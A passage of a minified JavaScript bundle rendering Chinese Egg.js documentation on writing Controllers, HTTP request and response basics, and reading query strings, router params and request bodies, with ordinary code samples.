\u4f20\u9012\u8fc7\u6765\u7684\u8bf7\u6c42\u53c2\u6570\u3002"),r.a.createElement("li",null,"\u6821\u9a8c\u3001\u7ec4\u88c5\u53c2\u6570\u3002"),r.a.createElement("li",null,"\u8c03\u7528 Service \u8fdb\u884c\u4e1a\u52a1\u5904\u7406\uff0c\u5fc5\u8981\u65f6\u5904\u7406\u8f6c\u6362 Service \u7684\u8fd4\u56de\u7ed3\u679c\uff0c\u8ba9\u5b83\u9002\u5e94\u7528\u6237\u7684\u9700\u6c42\u3002"),r.a.createElement("li",null,"\u901a\u8fc7 HTTP \u5c06\u7ed3\u679c\u54cd\u5e94\u7ed9\u7528\u6237\u3002")),r.a.createElement("h2",{id:"\u5982\u4f55\u7f16\u5199-controller"},r.a.createElement(l["AnchorLink"],{to:"#\u5982\u4f55\u7f16\u5199-controller","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5982\u4f55\u7f16\u5199 Controller"),r.a.createElement("p",null,"\u6240\u6709\u7684 Controller \u6587\u4ef6\u90fd\u5fc5\u987b\u653e\u5728 ",r.a.createElement("code",null,"app/controller")," \u76ee\u5f55\u4e0b\uff0c\u53ef\u4ee5\u652f\u6301\u591a\u7ea7\u76ee\u5f55\uff0c\u8bbf\u95ee\u7684\u65f6\u5019\u53ef\u4ee5\u901a\u8fc7\u76ee\u5f55\u540d\u7ea7\u8054\u8bbf\u95ee\u3002Controller \u652f\u6301\u591a\u79cd\u5f62\u5f0f\u8fdb\u884c\u7f16\u5199\uff0c\u53ef\u4ee5\u6839\u636e\u4e0d\u540c\u7684\u9879\u76ee\u573a\u666f\u548c\u5f00\u53d1\u4e60\u60ef\u6765\u9009\u62e9\u3002"),r.a.createElement("h3",{id:"controller-\u7c7b\u63a8\u8350"},r.a.createElement(l["AnchorLink"],{to:"#controller-\u7c7b\u63a8\u8350","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Controller \u7c7b\uff08\u63a8\u8350\uff09"),r.a.createElement("p",null,"\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5b9a\u4e49 Controller \u7c7b\u7684\u65b9\u5f0f\u6765\u7f16\u5199\u4ee3\u7801\uff1a"),r.a.createElement(o["a"],{code:"// app/controller/post.js\nconst Controller = require('egg').Controller;\nclass PostController extends Controller {\n  async create() {\n    const { ctx, service } = this;\n    const createRule = {\n      title: { type: 'string' },\n      content: { type: 'string' },\n    };\n    // \u6821\u9a8c\u53c2\u6570\n    ctx.validate(createRule);\n    // \u7ec4\u88c5\u53c2\u6570\n    const author = ctx.session.userId;\n    const req = Object.assign(ctx.request.body, { author });\n    // \u8c03\u7528 Service \u8fdb\u884c\u4e1a\u52a1\u5904\u7406\n    const res = await service.post.create(req);\n    // \u8bbe\u7f6e\u54cd\u5e94\u5185\u5bb9\u548c\u54cd\u5e94\u72b6\u6001\u7801\n    ctx.body = { id: res.id };\n    ctx.status = 201;\n  }\n}\nmodule.exports = PostController;",lang:"js"}),r.a.createElement("p",null,"\u6211\u4eec\u901a\u8fc7\u4e0a\u9762\u7684\u4ee3\u7801\u5b9a\u4e49\u4e86\u4e00\u4e2a ",r.a.createElement("code",null,"PostController")," \u7684\u7c7b\uff0c\u7c7b\u91cc\u9762\u7684\u6bcf\u4e00\u4e2a\u65b9\u6cd5\u90fd\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a Controller \u5728 Router \u4e2d\u5f15\u7528\u5230\uff0c\u6211\u4eec\u53ef\u4ee5\u4ece ",r.a.createElement("code",null,"app.controller")," \u6839\u636e\u6587\u4ef6\u540d\u548c\u65b9\u6cd5\u540d\u5b9a\u4f4d\u5230\u5b83\u3002"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  const { router, controller } = app;\n  router.post('createPost', '/api/posts', controller.post.create);\n};",lang:"js"}),r.a.createElement("p",null,"Controller \u652f\u6301\u591a\u7ea7\u76ee\u5f55\uff0c\u4f8b\u5982\u5982\u679c\u6211\u4eec\u5c06\u4e0a\u9762\u7684 Controller \u4ee3\u7801\u653e\u5230 ",r.a.createElement("code",null,"app/controller/sub/post.js")," \u4e2d\uff0c\u5219\u53ef\u4ee5\u5728 router \u4e2d\u8fd9\u6837\u4f7f\u7528\uff1a"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  app.router.post('createPost', '/api/posts', app.controller.sub.post.create);\n};",lang:"js"}),r.a.createElement("p",null,"\u5b9a\u4e49\u7684 Controller \u7c7b\uff0c\u4f1a\u5728\u6bcf\u4e00\u4e2a\u8bf7\u6c42\u8bbf\u95ee\u5230 server \u65f6\u5b9e\u4f8b\u5316\u4e00\u4e2a\u5168\u65b0\u7684\u5bf9\u8c61\uff0c\u800c\u9879\u76ee\u4e2d\u7684 Controller \u7c7b\u7ee7\u627f\u4e8e ",r.a.createElement("code",null,"egg.Controller"),"\uff0c\u4f1a\u6709\u4e0b\u9762\u51e0\u4e2a\u5c5e\u6027\u6302\u5728 ",r.a.createElement("code",null,"this")," \u4e0a\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"this.ctx"),": \u5f53\u524d\u8bf7\u6c42\u7684\u4e0a\u4e0b\u6587 ",r.a.createElement(l["AnchorLink"],{to:"./extend#context"},"Context")," \u5bf9\u8c61\u7684\u5b9e\u4f8b\uff0c\u901a\u8fc7\u5b83\u6211\u4eec\u53ef\u4ee5\u62ff\u5230\u6846\u67b6\u5c01\u88c5\u597d\u7684\u5904\u7406\u5f53\u524d\u8bf7\u6c42\u7684\u5404\u79cd\u4fbf\u6377\u5c5e\u6027\u548c\u65b9\u6cd5\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"this.app"),": \u5f53\u524d\u5e94\u7528 ",r.a.createElement(l["AnchorLink"],{to:"./extend#application"},"Application")," \u5bf9\u8c61\u7684\u5b9e\u4f8b\uff0c\u901a\u8fc7\u5b83\u6211\u4eec\u53ef\u4ee5\u62ff\u5230\u6846\u67b6\u63d0\u4f9b\u7684\u5168\u5c40\u5bf9\u8c61\u548c\u65b9\u6cd5\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"this.service"),"\uff1a\u5e94\u7528\u5b9a\u4e49\u7684 ",r.a.createElement(l["Link"],{to:"./service"},"Service"),"\uff0c\u901a\u8fc7\u5b83\u6211\u4eec\u53ef\u4ee5\u8bbf\u95ee\u5230\u62bd\u8c61\u51fa\u7684\u4e1a\u52a1\u5c42\uff0c\u7b49\u4ef7\u4e8e ",r.a.createElement("code",null,"this.ctx.service")," \u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"this.config"),"\uff1a\u5e94\u7528\u8fd0\u884c\u65f6\u7684",r.a.createElement(l["Link"],{to:"./config"},"\u914d\u7f6e\u9879"),"\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"this.logger"),"\uff1alogger \u5bf9\u8c61\uff0c\u4e0a\u9762\u6709\u56db\u4e2a\u65b9\u6cd5\uff08",r.a.createElement("code",null,"debug"),"\uff0c",r.a.createElement("code",null,"info"),"\uff0c",r.a.createElement("code",null,"warn"),"\uff0c",r.a.createElement("code",null,"error"),"\uff09\uff0c\u5206\u522b\u4ee3\u8868\u6253\u5370\u56db\u4e2a\u4e0d\u540c\u7ea7\u522b\u7684\u65e5\u5fd7\uff0c\u4f7f\u7528\u65b9\u6cd5\u548c\u6548\u679c\u4e0e ",r.a.createElement(l["AnchorLink"],{to:"../core/logger#context-logger"},"context logger")," \u4e2d\u4ecb\u7ecd\u7684\u4e00\u6837\uff0c\u4f46\u662f\u901a\u8fc7\u8fd9\u4e2a logger \u5bf9\u8c61\u8bb0\u5f55\u7684\u65e5\u5fd7\uff0c\u5728\u65e5\u5fd7\u524d\u9762\u4f1a\u52a0\u4e0a\u6253\u5370\u8be5\u65e5\u5fd7\u7684\u6587\u4ef6\u8def\u5f84\uff0c\u4ee5\u4fbf\u5feb\u901f\u5b9a\u4f4d\u65e5\u5fd7\u6253\u5370\u4f4d\u7f6e\u3002")),r.a.createElement("h4",{id:"\u81ea\u5b9a\u4e49-controller-\u57fa\u7c7b"},r.a.createElement(l["AnchorLink"],{to:"#\u81ea\u5b9a\u4e49-controller-\u57fa\u7c7b","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u81ea\u5b9a\u4e49 Controller \u57fa\u7c7b"),r.a.createElement("p",null,"\u6309\u7167\u7c7b\u7684\u65b9\u5f0f\u7f16\u5199 Controller\uff0c\u4e0d\u4ec5\u53ef\u4ee5\u8ba9\u6211\u4eec\u66f4\u597d\u7684\u5bf9 Controller \u5c42\u4ee3\u7801\u8fdb\u884c\u62bd\u8c61\uff08\u4f8b\u5982\u5c06\u4e00\u4e9b\u7edf\u4e00\u7684\u5904\u7406\u62bd\u8c61\u6210\u4e00\u4e9b\u79c1\u6709\u65b9\u6cd5\uff09\uff0c\u8fd8\u53ef\u4ee5\u901a\u8fc7\u81ea\u5b9a\u4e49 Controller \u57fa\u7c7b\u7684\u65b9\u5f0f\u5c01\u88c5\u5e94\u7528\u4e2d\u5e38\u7528\u7684\u65b9\u6cd5\u3002"),r.a.createElement(o["a"],{code:"// app/core/base_controller.js\nconst { Controller } = require('egg');\nclass BaseController extends Controller {\n  get user() {\n    return this.ctx.session.user;\n  }\n\n  success(data) {\n    this.ctx.body = {\n      success: true,\n      data,\n    };\n  }\n\n  notFound(msg) {\n    msg = msg || 'not found';\n    this.ctx.throw(404, msg);\n  }\n}\nmodule.exports = BaseController;",lang:"js"}),r.a.createElement("p",null,"\u6b64\u65f6\u5728\u7f16\u5199\u5e94\u7528\u7684 Controller \u65f6\uff0c\u53ef\u4ee5\u7ee7\u627f BaseController\uff0c\u76f4\u63a5\u4f7f\u7528\u57fa\u7c7b\u4e0a\u7684\u65b9\u6cd5\uff1a"),r.a.createElement(o["a"],{code:"//app/controller/post.js\nconst Controller = require('../core/base_controller');\nclass PostController extends Controller {\n  async list() {\n    const posts = await this.service.listByUser(this.user);\n    this.success(posts);\n  }\n}",lang:"js"}),r.a.createElement("h3",{id:"controller-\u65b9\u6cd5\u4e0d\u63a8\u8350\u4f7f\u7528\u53ea\u662f\u4e3a\u4e86\u517c\u5bb9"},r.a.createElement(l["AnchorLink"],{to:"#controller-\u65b9\u6cd5\u4e0d\u63a8\u8350\u4f7f\u7528\u53ea\u662f\u4e3a\u4e86\u517c\u5bb9","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Controller \u65b9\u6cd5\uff08\u4e0d\u63a8\u8350\u4f7f\u7528\uff0c\u53ea\u662f\u4e3a\u4e86\u517c\u5bb9\uff09"),r.a.createElement("p",null,"\u6bcf\u4e00\u4e2a Controller \u90fd\u662f\u4e00\u4e2a async function\uff0c\u5b83\u7684\u5165\u53c2\u4e3a\u8bf7\u6c42\u7684\u4e0a\u4e0b\u6587 ",r.a.createElement(l["AnchorLink"],{to:"./extend#context"},"Context")," \u5bf9\u8c61\u7684\u5b9e\u4f8b\uff0c\u901a\u8fc7\u5b83\u6211\u4eec\u53ef\u4ee5\u62ff\u5230\u6846\u67b6\u5c01\u88c5\u597d\u7684\u5404\u79cd\u4fbf\u6377\u5c5e\u6027\u548c\u65b9\u6cd5\u3002"),r.a.createElement("p",null,"\u4f8b\u5982\u6211\u4eec\u5199\u4e00\u4e2a\u5bf9\u5e94\u5230 ",r.a.createElement("code",null,"POST /api/posts")," \u63a5\u53e3\u7684 Controller\uff0c\u6211\u4eec\u4f1a\u5728 ",r.a.createElement("code",null,"app/controller")," \u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a ",r.a.createElement("code",null,"post.js")," \u6587\u4ef6"),r.a.createElement(o["a"],{code:"// app/controller/post.js\nexports.create = async (ctx) => {\n  const createRule = {\n    title: { type: 'string' },\n    content: { type: 'string' },\n  };\n  // \u6821\u9a8c\u53c2\u6570\n  ctx.validate(createRule);\n  // \u7ec4\u88c5\u53c2\u6570\n  const author = ctx.session.userId;\n  const req = Object.assign(ctx.request.body, { author });\n  // \u8c03\u7528 service \u8fdb\u884c\u4e1a\u52a1\u5904\u7406\n  const res = await ctx.service.post.create(req);\n  // \u8bbe\u7f6e\u54cd\u5e94\u5185\u5bb9\u548c\u54cd\u5e94\u72b6\u6001\u7801\n  ctx.body = { id: res.id };\n  ctx.status = 201;\n};",lang:"js"}),r.a.createElement("p",null,"\u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\u6211\u4eec\u5f15\u5165\u4e86\u8bb8\u591a\u65b0\u7684\u6982\u5ff5\uff0c\u4f46\u8fd8\u662f\u6bd4\u8f83\u76f4\u89c2\uff0c\u5bb9\u6613\u7406\u89e3\u7684\uff0c\u6211\u4eec\u4f1a\u5728\u4e0b\u9762\u5bf9\u5b83\u4eec\u8fdb\u884c\u66f4\u8be6\u7ec6\u7684\u4ecb\u7ecd\u3002"),r.a.createElement("h2",{id:"http-\u57fa\u7840"},r.a.createElement(l["AnchorLink"],{to:"#http-\u57fa\u7840","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"HTTP \u57fa\u7840"),r.a.createElement("p",null,"\u7531\u4e8e Controller \u57fa\u672c\u4e0a\u662f\u4e1a\u52a1\u5f00\u53d1\u4e2d\u552f\u4e00\u548c HTTP \u534f\u8bae\u6253\u4ea4\u9053\u7684\u5730\u65b9\uff0c\u5728\u7ee7\u7eed\u5f80\u4e0b\u4e86\u89e3\u4e4b\u524d\uff0c\u6211\u4eec\u9996\u5148\u7b80\u5355\u7684\u770b\u4e00\u4e0b HTTP \u534f\u8bae\u662f\u600e\u6837\u7684\u3002"),r.a.createElement("p",null,"\u5982\u679c\u6211\u4eec\u53d1\u8d77\u4e00\u4e2a HTTP \u8bf7\u6c42\u6765\u8bbf\u95ee\u524d\u9762\u4f8b\u5b50\u4e2d\u63d0\u5230\u7684 Controller\uff1a"),r.a.createElement(o["a"],{code:'curl -X POST http://localhost:3000/api/posts --data \'{"title":"controller", "content": "what is controller"}\' --header \'Content-Type:application/json; charset=UTF-8\'',lang:"unknown"}),r.a.createElement("p",null,"\u901a\u8fc7 curl \u53d1\u51fa\u7684 HTTP \u8bf7\u6c42\u7684\u5185\u5bb9\u5c31\u4f1a\u662f\u4e0b\u9762\u8fd9\u6837\u7684\uff1a"),r.a.createElement(o["a"],{code:'POST /api/posts HTTP/1.1\nHost: localhost:3000\nContent-Type: application/json; charset=UTF-8\n\n{"title": "controller", "content": "what is controller"}',lang:"unknown"}),r.a.createElement("p",null,"\u8bf7\u6c42\u7684\u7b2c\u4e00\u884c\u5305\u542b\u4e86\u4e09\u4e2a\u4fe1\u606f\uff0c\u6211\u4eec\u6bd4\u8f83\u5e38\u7528\u7684\u662f\u524d\u9762\u4e24\u4e2a\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"method\uff1a\u8fd9\u4e2a\u8bf7\u6c42\u4e2d method \u7684\u503c\u662f ",r.a.createElement("code",null,"POST"),"\u3002"),r.a.createElement("li",null,"path\uff1a\u503c\u4e3a ",r.a.createElement("code",null,"/api/posts"),"\uff0c\u5982\u679c\u7528\u6237\u7684\u8bf7\u6c42\u4e2d\u5305\u542b query\uff0c\u4e5f\u4f1a\u5728\u8fd9\u91cc\u51fa\u73b0")),r.a.createElement("p",null,"\u4ece\u7b2c\u4e8c\u884c\u5f00\u59cb\u76f4\u5230\u9047\u5230\u7684\u7b2c\u4e00\u4e2a\u7a7a\u884c\u4f4d\u7f6e\uff0c\u90fd\u662f\u8bf7\u6c42\u7684 Headers \u90e8\u5206\uff0c\u8fd9\u4e00\u90e8\u5206\u4e2d\u6709\u8bb8\u591a\u5e38\u7528\u7684\u5c5e\u6027\uff0c\u5305\u62ec\u8fd9\u91cc\u770b\u5230\u7684 Host\uff0cContent-Type\uff0c\u8fd8\u6709 ",r.a.createElement("code",null,"Cookie"),"\uff0c",r.a.createElement("code",null,"User-Agent")," \u7b49\u7b49\u3002\u5728\u8fd9\u4e2a\u8bf7\u6c42\u4e2d\u6709\u4e24\u4e2a\u5934\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"Host"),"\uff1a\u6211\u4eec\u5728\u6d4f\u89c8\u5668\u53d1\u8d77\u8bf7\u6c42\u7684\u65f6\u5019\uff0c\u57df\u540d\u4f1a\u7528\u6765\u901a\u8fc7 DNS \u89e3\u6790\u627e\u5230\u670d\u52a1\u7684 IP \u5730\u5740\uff0c\u4f46\u662f\u6d4f\u89c8\u5668\u4e5f\u4f1a\u5c06\u57df\u540d\u548c\u7aef\u53e3\u53f7\u653e\u5728 Host \u5934\u4e2d\u4e00\u5e76\u53d1\u9001\u7ed9\u670d\u52a1\u7aef\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"Content-Type"),"\uff1a\u5f53\u6211\u4eec\u7684\u8bf7\u6c42\u6709 body \u7684\u65f6\u5019\uff0c\u90fd\u4f1a\u6709 Content-Type \u6765\u6807\u660e\u6211\u4eec\u7684\u8bf7\u6c42\u4f53\u662f\u4ec0\u4e48\u683c\u5f0f\u7684\u3002")),r.a.createElement("p",null,"\u4e4b\u540e\u7684\u5185\u5bb9\u5168\u90e8\u90fd\u662f\u8bf7\u6c42\u7684 body\uff0c\u5f53\u8bf7\u6c42\u662f POST, PUT, DELETE \u7b49\u65b9\u6cd5\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u5e26\u4e0a\u8bf7\u6c42\u4f53\uff0c\u670d\u52a1\u7aef\u4f1a\u6839\u636e Content-Type \u6765\u89e3\u6790\u8bf7\u6c42\u4f53\u3002"),r.a.createElement("p",null,"\u5728\u670d\u52a1\u7aef\u5904\u7406\u5b8c\u8fd9\u4e2a\u8bf7\u6c42\u540e\uff0c\u4f1a\u53d1\u9001\u4e00\u4e2a HTTP \u54cd\u5e94\u7ed9\u5ba2\u6237\u7aef"),r.a.createElement(o["a"],{code:'HTTP/1.1 201 Created\nContent-Type: application/json; charset=utf-8\nContent-Length: 8\nDate: Mon, 09 Jan 2017 08:40:28 GMT\nConnection: keep-alive\n\n{"id": 1}',lang:"unknown"}),r.a.createElement("p",null,"\u7b2c\u4e00\u884c\u4e2d\u4e5f\u5305\u542b\u4e86\u4e09\u6bb5\uff0c\u5176\u4e2d\u6211\u4eec\u5e38\u7528\u7684\u4e3b\u8981\u662f",r.a.createElement(l["Link"],{to:"https://en.wikipedia.org/wiki/List_of_HTTP_status_codes"},"\u54cd\u5e94\u72b6\u6001\u7801"),"\uff0c\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\u5b83\u7684\u503c\u662f 201\uff0c\u5b83\u7684\u542b\u4e49\u662f\u5728\u670d\u52a1\u7aef\u6210\u529f\u521b\u5efa\u4e86\u4e00\u6761\u8d44\u6e90\u3002"),r.a.createElement("p",null,"\u548c\u8bf7\u6c42\u4e00\u6837\uff0c\u4ece\u7b2c\u4e8c\u884c\u5f00\u59cb\u5230\u4e0b\u4e00\u4e2a\u7a7a\u884c\u4e4b\u95f4\u90fd\u662f\u54cd\u5e94\u5934\uff0c\u8fd9\u91cc\u7684 Content-Type, Content-Length \u8868\u793a\u8fd9\u4e2a\u54cd\u5e94\u7684\u683c\u5f0f\u662f JSON\uff0c\u957f\u5ea6\u4e3a 8 \u4e2a\u5b57\u8282\u3002"),r.a.createElement("p",null,"\u6700\u540e\u5269\u4e0b\u7684\u90e8\u5206\u5c31\u662f\u8fd9\u6b21\u54cd\u5e94\u771f\u6b63\u7684\u5185\u5bb9\u3002"),r.a.createElement("h2",{id:"\u83b7\u53d6-http-\u8bf7\u6c42\u53c2\u6570"},r.a.createElement(l["AnchorLink"],{to:"#\u83b7\u53d6-http-\u8bf7\u6c42\u53c2\u6570","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u83b7\u53d6 HTTP \u8bf7\u6c42\u53c2\u6570"),r.a.createElement("p",null,"\u4ece\u4e0a\u9762\u7684 HTTP \u8bf7\u6c42\u793a\u4f8b\u4e2d\u53ef\u4ee5\u770b\u5230\uff0c\u6709\u597d\u591a\u5730\u65b9\u53ef\u4ee5\u653e\u7528\u6237\u7684\u8bf7\u6c42\u6570\u636e\uff0c\u6846\u67b6\u901a\u8fc7\u5728 Controller \u4e0a\u7ed1\u5b9a\u7684 Context \u5b9e\u4f8b\uff0c\u63d0\u4f9b\u4e86\u8bb8\u591a\u4fbf\u6377\u65b9\u6cd5\u548c\u5c5e\u6027\u83b7\u53d6\u7528\u6237\u901a\u8fc7 HTTP \u8bf7\u6c42\u53d1\u9001\u8fc7\u6765\u7684\u53c2\u6570\u3002"),r.a.createElement("h3",{id:"query"},r.a.createElement(l["AnchorLink"],{to:"#query","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"query"),r.a.createElement("p",null,"\u5728 URL \u4e2d ",r.a.createElement("code",null,"?")," \u540e\u9762\u7684\u90e8\u5206\u662f\u4e00\u4e2a Query String\uff0c\u8fd9\u4e00\u90e8\u5206\u7ecf\u5e38\u7528\u4e8e GET \u7c7b\u578b\u7684\u8bf7\u6c42\u4e2d\u4f20\u9012\u53c2\u6570\u3002\u4f8b\u5982 ",r.a.createElement("code",null,"GET /posts?category=egg&language=node")," \u4e2d ",r.a.createElement("code",null,"category=egg&language=node")," \u5c31\u662f\u7528\u6237\u4f20\u9012\u8fc7\u6765\u7684\u53c2\u6570\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"ctx.query")," \u62ff\u5230\u89e3\u6790\u8fc7\u540e\u7684\u8fd9\u4e2a\u53c2\u6570\u4f53"),r.a.createElement(o["a"],{code:"class PostController extends Controller {\n  async listPosts() {\n    const query = this.ctx.query;\n    // {\n    //   category: 'egg',\n    //   language: 'node',\n    // }\n  }\n}",lang:"js"}),r.a.createElement("p",null,"\u5f53 Query String \u4e2d\u7684 key \u91cd\u590d\u65f6\uff0c",r.a.createElement("code",null,"ctx.query")," \u53ea\u53d6 key \u7b2c\u4e00\u6b21\u51fa\u73b0\u65f6\u7684\u503c\uff0c\u540e\u9762\u518d\u51fa\u73b0\u7684\u90fd\u4f1a\u88ab\u5ffd\u7565\u3002",r.a.createElement("code",null,"GET /posts?category=egg&category=koa")," \u901a\u8fc7 ",r.a.createElement("code",null,"ctx.query")," \u62ff\u5230\u7684\u503c\u662f ",r.a.createElement("code",null,"{"," category: 'egg' ","}"),"\u3002"),r.a.createElement("p",null,"\u8fd9\u6837\u5904\u7406\u7684\u539f\u56e0\u662f\u4e3a\u4e86\u4fdd\u6301\u7edf\u4e00\u6027\uff0c\u7531\u4e8e\u901a\u5e38\u60c5\u51b5\u4e0b\u6211\u4eec\u90fd\u4e0d\u4f1a\u8bbe\u8ba1\u8ba9\u7528\u6237\u4f20\u9012 key \u76f8\u540c\u7684 Query String\uff0c\u6240\u4ee5\u6211\u4eec\u7ecf\u5e38\u4f1a\u5199\u7c7b\u4f3c\u4e0b\u9762\u7684\u4ee3\u7801\uff1a"),r.a.createElement(o["a"],{code:"const key = ctx.query.key || '';\nif (key.startsWith('egg')) {\n  // do something\n}",lang:"js"}),r.a.createElement("p",null,"\u800c\u5982\u679c\u6709\u4eba\u6545\u610f\u53d1\u8d77\u8bf7\u6c42\u5728 Query String \u4e2d\u5e26\u4e0a\u91cd\u590d\u7684 key \u6765\u8bf7\u6c42\u65f6\u5c31\u4f1a\u5f15\u53d1\u7cfb\u7edf\u5f02\u5e38\u3002\u56e0\u6b64\u6846\u67b6\u4fdd\u8bc1\u4e86\u4ece ",r.a.createElement("code",null,"ctx.query")," \u4e0a\u83b7\u53d6\u7684\u53c2\u6570\u4e00\u65e6\u5b58\u5728\uff0c\u4e00\u5b9a\u662f\u5b57\u7b26\u4e32\u7c7b\u578b\u3002"),r.a.createElement("h4",{id:"queries"},r.a.createElement(l["AnchorLink"],{to:"#queries","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"queries"),r.a.createElement("p",null,"\u6709\u65f6\u5019\u6211\u4eec\u7684\u7cfb\u7edf\u4f1a\u8bbe\u8ba1\u6210\u8ba9\u7528\u6237\u4f20\u9012\u76f8\u540c\u7684 key\uff0c\u4f8b\u5982 ",r.a.createElement("code",null,"GET /posts?category=egg&id=1&id=2&id=3"),"\u3002\u9488\u5bf9\u6b64\u7c7b\u60c5\u51b5\uff0c\u6846\u67b6\u63d0\u4f9b\u4e86 ",r.a.createElement("code",null,"ctx.queries")," \u5bf9\u8c61\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u4e5f\u89e3\u6790\u4e86 Query String\uff0c\u4f46\u662f\u5b83\u4e0d\u4f1a\u4e22\u5f03\u4efb\u4f55\u4e00\u4e2a\u91cd\u590d\u7684\u6570\u636e\uff0c\u800c\u662f\u5c06\u4ed6\u4eec\u90fd\u653e\u5230\u4e00\u4e2a\u6570\u7ec4\u4e2d\uff1a"),r.a.createElement(o["a"],{code:"// GET /posts?category=egg&id=1&id=2&id=3\nclass PostController extends Controller {\n  async listPosts() {\n    console.log(this.ctx.queries);\n    // {\n    //   category: [ 'egg' ],\n    //   id: [ '1', '2', '3' ],\n    // }\n  }\n}",lang:"js"}),r.a.createElement("p",null,r.a.createElement("code",null,"ctx.queries")," \u4e0a\u6240\u6709\u7684 key \u5982\u679c\u6709\u503c\uff0c\u4e5f\u4e00\u5b9a\u4f1a\u662f\u6570\u7ec4\u7c7b\u578b\u3002"),r.a.createElement("h3",{id:"router-params"},r.a.createElement(l["AnchorLink"],{to:"#router-params","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Router params"),r.a.createElement("p",null,"\u5728 ",r.a.createElement(l["Link"],{to:"./router"},"Router")," \u4e2d\uff0c\u6211\u4eec\u4ecb\u7ecd\u4e86 Router \u4e0a\u4e5f\u53ef\u4ee5\u7533\u660e\u53c2\u6570\uff0c\u8fd9\u4e9b\u53c2\u6570\u90fd\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"ctx.params")," \u83b7\u53d6\u5230\u3002"),r.a.createElement(o["a"],{code:"// app.get('/projects/:projectId/app/:appId', 'app.listApp');\n// GET /projects/1/app/2\nclass AppController extends Controller {\n  async listApp() {\n    assert.equal(this.ctx.params.projectId, '1');\n    assert.equal(this.ctx.params.appId, '2');\n  }\n}",lang:"js"}),r.a.createElement("h3",{id:"body"},r.a.createElement(l["AnchorLink"],{to:"#body","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"body"),r.a.createElement("p",null,"\u867d\u7136\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 URL \u4f20\u9012\u53c2\u6570\uff0c\u4f46\u662f\u8fd8\u662f\u6709\u8bf8\u591a\u9650\u5236\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"http://stackoverflow.com/questions/417142/what-is-the-maximum-length-of-a-url-in-different-browsers"},"\u6d4f\u89c8\u5668\u4e2d\u4f1a\u5bf9 URL \u7684\u957f\u5ea6\u6709\u6240\u9650\u5236"),"\uff0c\u5982\u679c\u9700\u8981\u4f20\u9012\u7684\u53c2\u6570\u8fc7\u591a\u5c31\u4f1a\u65e0\u6cd5\u4f20\u9012\u3002"),r.a.createElement("li",null,"\u670d\u52a1\u7aef\u7ecf\u5e38\u4f1a\u5c06\u8bbf\u95ee\u7684\u5b8c\u6574 URL \u8bb0\u5f55\u5230\u65e5\u5fd7\u6587\u4ef6\u4e2d\uff0c\u6709\u4e00\u4e9b\u654f\u611f\u6570\u636e\u901a\u8fc7 URL \u4f20\u9012\u4f1a\u4e0d\u5b89\u5168\u3002")),r.a.createElement("p",null,"\u5728\u524d\u9762\u7684 HTTP \u8bf7\u6c42\u62a5\u6587\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u770b\u5230\u5728 header \u4e4b\u540e\u8fd8\u6709\u4e00\u4e2a body \u90e8\u5206\uff0c\u6211\u4eec\u901a\u5e38\u4f1a\u5728\u8fd9\u4e2a\u90e8\u5206\u4f20\u9012 POST\u3001PUT \u548c DELETE \u7b49\u65b9\u6cd5\u7684\u53c2\u6570\u3002\u4e00\u822c\u8bf7\u6c42\u4e2d\u6709 body \u7684\u65f6\u5019\uff0c\u5ba2\u6237\u7aef\uff08\u6d4f\u89c8\u5668\uff09\u4f1a\u540c\u65f6\u53d1\u9001 ",r.a.createElement("code",null,"Content-Type")," \u544a\u8bc9\u670d\u52a1\u7aef\u8fd9\u6b21\u8bf7\u6c42\u7684 body \u662f\u4ec0\u4e48\u683c\u5f0f\u7684\u3002Web \u5f00\u53d1\u4e2d\u6570\u636e\u4f20\u9012\u6700\u5e38\u7528\u7684\u4e24\u7c7b\u683c\u5f0f\u5206\u522b\u662f JSON \u548c Form\u3002"),r.a.createElement("p",null,"\u6846\u67b6\u5185\u7f6e\u4e86 ",r.a.createElement(l["Link"],{to:"https://github.com/koajs/bodyparser"},"bodyParser")," \u4e2d\u95f4\u4ef6\u6765\u5bf9\u8fd9\u4e24\u7c7b\u683c\u5f0f\u7684\u8bf7\u6c42 body \u89e3\u6790\u6210 object \u6302\u8f7d\u5230 ",r.a.createElement("code",null,"ctx.request.body")," \u4e0a\u3002HTTP \u534f\u8bae\u4e2d\u5e76\u4e0d\u5efa\u8bae\u5728\u901a\u8fc7 GET\u3001HEAD \u65b9\u6cd5\u8bbf\u95ee\u65f6\u4f20\u9012 body\uff0c\u6240\u4ee5\u6211\u4eec\u65e0\u6cd5\u5728 GET\u3001HEAD 